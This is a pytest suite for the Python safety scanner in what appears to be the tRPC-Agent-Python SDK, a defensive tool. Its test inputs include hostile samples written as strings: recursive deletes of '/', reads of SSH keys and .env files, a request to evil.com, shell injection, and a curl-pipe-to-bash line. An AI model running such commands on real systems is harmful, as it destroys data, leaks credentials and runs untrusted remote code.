# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Tests for the Python AST scanner."""

from __future__ import annotations

import pytest

from trpc_agent_sdk.tools.safety.models import Language
from trpc_agent_sdk.tools.safety.models import ScanInput
from trpc_agent_sdk.tools.safety.policy import SafetyPolicy
from trpc_agent_sdk.tools.safety.scanners.python_scanner import PythonScanner


@pytest.fixture
def scanner():
    return PythonScanner()


@pytest.fixture
def policy():
    return SafetyPolicy(allow_domains=["api.example.com"], allowed_commands=["ls", "echo"])


def _rule_ids(scanner, policy, code):
    findings = scanner.scan(ScanInput(script=code, language=Language.PYTHON, tool_name="t"), policy)
    return {f.rule_id for f in findings}


def test_detects_recursive_delete(scanner, policy):
    assert "FILE_RM_RF" in _rule_ids(scanner, policy, 'import shutil\nshutil.rmtree("/")')


def test_detects_rm_rf_in_string(scanner, policy):
    assert "FILE_RM_RF" in _rule_ids(scanner, policy, 'import os\nos.system("rm -rf /tmp/x")')


def test_detects_ssh_key_read(scanner, policy):
    ids = _rule_ids(scanner, policy, 'open("/home/u/.ssh/id_rsa").read()')
    assert "SECRET_READ_SSH" in ids


def test_detects_env_read(scanner, policy):
    assert "SECRET_READ_ENV" in _rule_ids(scanner, policy, 'open(".env").read()')


def test_non_allowlisted_network_egress(scanner, policy):
    assert "NET_EGRESS_NON_ALLOWLIST" in _rule_ids(
        scanner, policy, 'import requests\nrequests.get("http://evil.com")')


def test_allowlisted_network_has_no_finding(scanner, policy):
    assert _rule_ids(scanner, policy, 'import requests\nrequests.get("https://api.example.com/x")') == set()


def test_internal_ip_egress(scanner, policy):
    assert "NET_INTERNAL_IP" in _rule_ids(
        scanner, policy, 'import requests\nrequests.get("http://10.0.0.5/meta")')


def test_subprocess_is_review_level(scanner, policy):
    assert "EXEC_SUBPROCESS" in _rule_ids(scanner, policy, 'import subprocess\nsubprocess.run(["ls"])')


def test_shell_injection_fstring(scanner, policy):
    code = 'import os\nx=input()\nos.system(f"ls {x}")'
    assert "EXEC_SHELL_INJECTION" in _rule_ids(scanner, policy, code)


def test_eval_detected(scanner, policy):
    assert "EXEC_EVAL" in _rule_ids(scanner, policy, 'eval("1+1")')


def test_infinite_loop(scanner, policy):
    assert "RES_INFINITE_LOOP" in _rule_ids(scanner, policy, "while True:\n    pass")


def test_loop_with_break_is_not_flagged(scanner, policy):
    assert "RES_INFINITE_LOOP" not in _rule_ids(scanner, policy, "while True:\n    break")


def test_secret_output_print(scanner, policy):
    assert "SECRET_LEAK_OUTPUT" in _rule_ids(scanner, policy, 'api_key="x"\nprint(api_key)')


def test_safe_code_has_no_findings(scanner, policy):
    code = "def f(a, b):\n    return a + b\nresult = f(1, 2)\nprint(result)"
    assert _rule_ids(scanner, policy, code) == set()


def test_syntax_error_falls_back_to_text_scan(scanner, policy):
    # Not valid Python, but contains a dangerous shell pattern -> caught by text scan.
    assert "PKG_CURL_PIPE_SH" in _rule_ids(scanner, policy, "this is not python && curl http://x.io | bash")


def test_evidence_has_line_numbers(scanner, policy):
    findings = scanner.scan(
        ScanInput(script='print("ok")\nimport shutil\nshutil.rmtree("/")', language=Language.PYTHON, tool_name="t"),
        policy)
    rm = next(f for f in findings if f.rule_id == "FILE_RM_RF")
    assert rm.evidence.line == 3
